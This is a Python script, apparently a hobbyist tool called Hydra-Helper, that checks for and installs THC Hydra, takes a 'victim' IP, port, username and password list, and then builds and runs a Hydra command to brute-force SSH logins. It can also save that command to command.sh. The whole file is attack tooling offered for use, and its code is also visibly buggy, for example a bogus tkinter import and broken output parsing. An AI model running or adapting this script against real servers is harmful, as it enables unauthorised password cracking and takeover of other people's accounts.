
import os
import sys
import ipaddress
import subprocess

import time
import random
from tkinter import EXCEPTION

logo = '''
██╗░░██╗██╗░░░██╗██████╗░██████╗░░█████╗░░░░░░░██╗░░██╗███████╗██╗░░░░░██████╗░███████╗██████╗░
██║░░██║╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗░░░░░░██║░░██║██╔════╝██║░░░░░██╔══██╗██╔════╝██╔══██╗
███████║░╚████╔╝░██║░░██║██████╔╝███████║█████╗███████║█████╗░░██║░░░░░██████╔╝█████╗░░██████╔╝
██╔══██║░░╚██╔╝░░██║░░██║██╔══██╗██╔══██║╚════╝██╔══██║██╔══╝░░██║░░░░░██╔═══╝░██╔══╝░░██╔══██╗
██║░░██║░░░██║░░░██████╔╝██║░░██║██║░░██║░░░░░░██║░░██║███████╗███████╗██║░░░░░███████╗██║░░██║
╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░░░░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝
'''
print(logo)
time.sleep(1)
Verbos = True


def INFO(text):
    if Verbos:
        print(text)


file = os.path.basename(__file__)


class b:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\u001b[31m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\u001b[37m'


def close():
    print(f'{b.WARNING}[PROMPT]{b.OKBLUE} Promting to close {b.ENDC}')
    input(
        f'{b.FAIL}[INTERACTION]{b.HEADER} Press {b.OKCYAN}||ENTER||{b.HEADER} to Exit{b.ENDC}')
    print(f'{b.FAIL}[EXIT]{b.OKBLUE} Exiting Program {b.ENDC}')
    sys.exit()


def installHydra():
    print(
        f'{b.FAIL}[WARNING]{b.OKBLUE} Do you want to install hydra {b.OKCYAN}(Y/n){b.ENDC}')
    responce = input()
    print()
    if responce == None or responce == 'y' or responce == 'Y':

        proc = subprocess.Popen('sudo apt install hydra-gtk', stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        if not err == None:
            print()
            print(
                f'{b.FAIL}[ERROR]{b.OKBLUE} Unable to install hydra, (must use linux) {b.ENDC}')
        else:
            print(
                f'{b.OKGREEN}[SUCCES]{b.OKBLUE} Succesfuly install Hydra {b.ENDC}')
        close()

    elif responce == 'n' or responce == 'N':
        close()


INFO(f'{b.WARNING}[INFO]{b.HEADER} Checking if Hydra is installed{b.ENDC}')

try:
    rc = subprocess.call(['which', 'hydra'])
except FileNotFoundError:
    rc = subprocess.call(['where', 'hydra'])
except EXCEPTION as e:
    INFO(f'{b.FAIL}{e}{b.ENDC}')


if rc == 0:
    INFO(f'{b.WARNING}[INFO]{b.OKGREEN} Hydra is installed{b.ENDC}')
    pass
else:
    INFO(f'{b.FAIL}[ERROR]{b.WARNING} Hydra is not installed{b.ENDC}')
    INFO(f'{b.WARNING}[INFO]{b.HEADER} run {b.OKCYAN}sudo apt install hydra-gtk{b.HEADER} to proceed, then restart program {b.ENDC}')
    installHydra()
    print()


print(
    f'{b.WARNING}[INFO]{b.HEADER} this program will run hydra to crack SSH passwords{b.ENDC}')
print(f'{b.WARNING}[INFO]{b.HEADER} You can enter diffrent port but the program will crash (unless that port is being used for SSH){b.ENDC}')
input(
    f'{b.FAIL}[INTERACTION]{b.HEADER} Press {b.OKCYAN}||ENTER||{b.HEADER} to Continue{b.ENDC}')


def help():
    print('')
    print(f'{b.WHITE}==========HELP=========={b.ENDC}')
    print('')
    print(f'{b.WARNING}Arguments: {b.ENDC}')
    print(f'  {b.OKGREEN}-v {b.WHITE}-{b.OKCYAN} Verbose{b.ENDC}')
    print(f'  {b.OKGREEN}-h {b.WHITE}-{b.OKCYAN} Displayes this message{b.ENDC}')
    print(f'  {b.OKGREEN}-t {b.WHITE}-{b.OKCYAN} Set amout of threads to run{b.ENDC}')
    print(f'  {b.OKGREEN}-ip {b.WHITE}-{b.OKCYAN} Set victum ip{b.ENDC}')
    print(f'  {b.OKGREEN}-port {b.WHITE}-{b.OKCYAN} Set victum port{b.ENDC}')
    print(
        f'  {b.OKGREEN}-passlist {b.WHITE}-{b.OKCYAN} Set a password list to use{b.ENDC}')
    print(
        f'  {b.OKGREEN}-username {b.WHITE}-{b.OKCYAN} Set a username list to use{b.ENDC}')
    print('')
    print(f'{b.HEADER}Made By Gigabite-Studios')
    print(f'{b.OKCYAN}[https://github.com/ousmblueninja]{b.ENDC}')
    sys.exit()


try:
    args = sys.argv
    try:
        args.remove(file)
    except ValueError:
        print()
        INFO(f'{b.FAIL}[ERROR]{b.WARNING} cannot filter args{b.ENDC}')
        INFO(f'{b.FAIL}[ERROR]{b.WARNING} Please do {b.OKCYAN}-h{b.WARNING} to display help menu{b.ENDC}')
        print()
        close()
except IndexError:
    Verbos = False
    pass
if args.__contains__('-v'):
    Verbos = True
else:
    Verbos = False
if args.__contains__('-h'):
    help()

if args.__contains__('-ip'):

    argument = int(args.index('-ip')) + 1
    IP = args[argument]
THREADS = None
if args.__contains__('-t'):

    argument = int(args.index('-t')) + 1
    THREADS = args[argument]
    INFO(
        f'{b.WARNING}[INFO]{b.OKBLUE} Set amout of THREADS to {b.OKGREEN}{THREADS}{b.ENDC}')

if args.__contains__('-port'):
    argument = int(args.index('-port')) + 1
    PORT = args[argument]
else:
    PORT = str(22)

if args.__contains__('-passlist'):
    argument = int(args.index('-passlist')) + 1
    passlist = args[argument]
    INFO(
        f'{b.WARNING}[INFO]{b.OKBLUE} Set passlist to {b.OKGREEN}{passlist}{b.ENDC}')

if args.__contains__('-username'):
    argument = int(args.index('-username')) + 1
    username = args[argument]
    INFO(
        f'{b.WARNING}[INFO]{b.OKBLUE} Set username to {b.OKGREEN}{username}{b.ENDC}')

try:
    if not PORT.isnumeric():
        INFO(f'{b.FAIL}[ERROR] {PORT} is not and PORT{b.ENDC}')
    try:
        if not ipaddress.ip_address(IP):
            INFO(f'{b.FAIL}[ERROR] {IP} is not and IP{b.ENDC}')
    except ValueError:
        INFO(f'{b.FAIL}[ERROR] {IP} is not a valid ip address{b.ENDC}')
except NameError:

    INFO(f'{b.FAIL}[ERROR] NameError{b.ENDC}')
    INFO(
        f'{b.FAIL}[ERROR] {b.WARNING}IP or PORT is Null, please do -ip/-port to specify ip / port{b.ENDC}')

if ipaddress.ip_address(IP):
    INFO(f'{b.WARNING}[INFO]{b.OKBLUE} Set IP to {b.OKGREEN}{IP}{b.ENDC}')
if PORT.isnumeric():
    INFO(f'{b.WARNING}[INFO]{b.OKBLUE} Set PORT to {b.OKGREEN}{PORT}{b.ENDC}')
if not PORT == '22':
    print(f'{b.FAIL}[INTERACTION]{b.OKBLUE} Are you sure you want to run SSH attack on PORT {b.OKGREEN}{PORT} {b.OKCYAN}(Y/n){b.ENDC}')

    responce = input()
    print()
    if responce == None or responce == 'y' or responce == 'Y':
        pass
    elif responce == 'n' or responce == 'N':
        close()

if THREADS == None:
    INFO(
        f'{b.WARNING}[WARNING]{b.OKBLUE} No THREADS set, defaulting to {b.OKCYAN}8{b.ENDC}')
    finalArgument = 'sudo hydra -l ' + username + \
        ' -P '+passlist + ' ssh://'+IP + ' -t 8'
else:
    finalArgument = 'sudo hydra -l ' + username + \
        ' -P '+passlist + ' ssh://'+IP + ' -t '+THREADS
print(f'{b.OKGREEN}[SUCSESS]{b.ENDC}')
print()
print(f'{b.OKGREEN}[OUTPUT]{b.OKCYAN} {finalArgument}{b.ENDC}')
print()


print(
    f'{b.FAIL}[INTERACTION]{b.OKBLUE} Do you want to run the command  {b.OKCYAN}(Y/n){b.ENDC}')
responce = input()
print()
if responce == None or responce == 'y' or responce == 'Y':
    print(
        f'{b.WARNING}[INFO]{b.OKBLUE} Running SSH: PORT {b.OKGREEN}{PORT}{b.ENDC}')
    print()
    proc = subprocess.Popen(finalArgument, stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    if err == None:
    #saves the output to an array so it can get the password and username from it
      
      try:  
        uname = int(out.index('login:')) + 1
        print(out[uname])
      except:
        print(out)
        print(out.type())
      
      
      #host = int(out.index('host:')) + 1
      #passkey = int(out.index('password:')) + 1
      
      #print(f'sshpass -p {passkey} {uname}@{host}')
      
      
    else:
      print(f'{b.FAIL}[ERROR] {b.WARNING}Unable to run command{b.ENDC}')
      print(f'{b.FAIL}{err}{b.ENDC}')
    pass
elif responce == 'n' or responce == 'N':

    print(
        f'{b.FAIL}[INTERACTION]{b.OKBLUE} Do you want to Save the command  {b.OKCYAN}(Y/n){b.ENDC}')
    responce = input()
    print()
    if responce == None or responce == 'y' or responce == 'Y':
        INFO(f'{b.WARNING}[INFO]{b.OKBLUE} Saving Command to {b.OKCYAN}command.sh {b.ENDC}')
        time.sleep(0.3)
        INFO(f'{b.WARNING}[INFO]{b.OKBLUE} Creating {b.OKCYAN}command.sh{b.ENDC}')
        f = open('command.sh', 'a')
        time.sleep(0.5)
        INFO(f'{b.WARNING}[INFO]{b.OKBLUE} Saving file {b.ENDC}')
        f.write(finalArgument)
        time.sleep(0.7)
        INFO(f'{b.WARNING}[INFO]{b.OKBLUE} Closing file{b.ENDC}')
        f.close()
        pass
    elif responce == 'n' or responce == 'N':
        close()

    print()


input(f'{b.FAIL}[INTERACTION]{b.HEADER} Press {b.OKCYAN}||ENTER||{b.HEADER} to close window{b.ENDC}')
